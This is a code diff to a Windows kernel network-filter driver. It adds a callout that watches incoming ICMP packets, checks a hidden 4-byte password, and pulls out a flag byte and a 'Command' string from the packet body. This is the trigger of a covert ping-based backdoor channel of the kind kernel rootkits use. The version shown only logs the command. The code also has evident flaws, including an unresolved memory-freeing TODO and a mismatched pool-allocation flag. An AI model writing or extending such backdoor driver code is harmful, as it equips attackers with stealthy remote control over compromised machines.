@@ -1,4 +1,5 @@
 #include "Trigger.h"         // Include the trigger header file
+#include "Config.h"
 
 NTSTATUS WfpInit(PDRIVER_OBJECT driverObject) {
     engineHandle = NULL; // Initialize to NULL (just precaution)
@@ -72,16 +73,69 @@ VOID CalloutFilter(
     UINT64 flowContext,
     FWPS_CLASSIFY_OUT* classifyOut
 ) {
-    UNREFERENCED_PARAMETER(inFixedValues);
-    UNREFERENCED_PARAMETER(inMetaValues);
-    UNREFERENCED_PARAMETER(layerData);
     UNREFERENCED_PARAMETER(classifyContext);
     UNREFERENCED_PARAMETER(filter);
     UNREFERENCED_PARAMETER(flowContext);
     UNREFERENCED_PARAMETER(classifyOut);
 
-    // Packet parsing logic goes here...
-    KdPrint(("[PER Driver] Received a packet!\n"));
+    if (!layerData)
+        return;
+
+    if (inFixedValues->incomingValue[FWPS_FIELD_DATAGRAM_DATA_V4_IP_PROTOCOL].value.uint8 != IPPROTO_ICMP || inMetaValues->ipHeaderSize <= 0)
+        return;
+
+    NET_BUFFER_LIST* fragmentList = (NET_BUFFER_LIST*)layerData;
+    NET_BUFFER *firstFragment = NET_BUFFER_LIST_FIRST_NB(fragmentList);
+
+    ULONG  icmpLength    = firstFragment->DataLength;  // Size of the ICMP packet
+    UINT32 dataLength    = icmpLength - 8;             // ICMP data size    = ICMP packet size - ICMP header size    
+    UINT32 payloadLength = dataLength - 4 - 1;         // ICMP payload size = ICMP packet size - ICMP header size - 4 (password size) - 1 (reserved flag size) 
+
+    if (dataLength <= 4 || dataLength >= 1473) {
+        KdPrint(("[PER Driver] Wrong data length in ICMP, skipping"));
+        return;
+    }
+
+    // Allocate memory for the ICMP packet
+    // TODO: free memory?
+    PVOID icmpBuffer = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)icmpLength, ALLOC_TAG_NAME);
+    if (!icmpBuffer)
+        return;
+
+    // Copy the packet
+    PBYTE icmpPacket = (PBYTE)NdisGetDataBuffer(firstFragment, (ULONG)icmpLength, icmpBuffer, 1, 0);
+    if (!icmpPacket)
+        goto freeBuffer;
+
+    BYTE icmpPassword[4] = {0};
+    RtlCopyMemory(icmpPassword, &icmpPacket[8], 4);
+
+    if (!RtlEqualMemory(icmpPassword, PASSWORD, 4)) {
+        KdPrint(("[PER Driver] Invalid password in ICMP packet"));
+        goto freeBuffer;
+    }
+
+    BYTE icmpFlag = icmpPacket[12];
+
+    // Allocate for ICMP payload
+    LPSTR icmpPayload = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)(payloadLength + 1), ALLOC_TAG_NAME); 
+    if (!icmpPayload)
+        goto freeBuffer;
+
+    // Extract payload
+    RtlZeroMemory(icmpPayload, payloadLength + 1);
+    RtlCopyMemory(icmpPayload, &icmpPacket[13], payloadLength);
+
+    icmpPayload[payloadLength] = '\0';
+
+    KdPrint(("[PER Driver] Password: {0x%x, 0x%x, 0x%x, 0x%x}", icmpPassword[0], icmpPassword[1], icmpPassword[2], icmpPassword[3]));
+    KdPrint(("[PER Driver] Flag: 0x%x", icmpFlag));
+    KdPrint(("[PER Driver] Command: %s", icmpPayload));
+
+    ExFreePoolWithTag((PVOID)icmpPayload, ALLOC_TAG_NAME);
+
+freeBuffer:
+    ExFreePoolWithTag((PVOID)icmpBuffer, ALLOC_TAG_NAME);
 }
 
 NTSTATUS CalloutNotify(
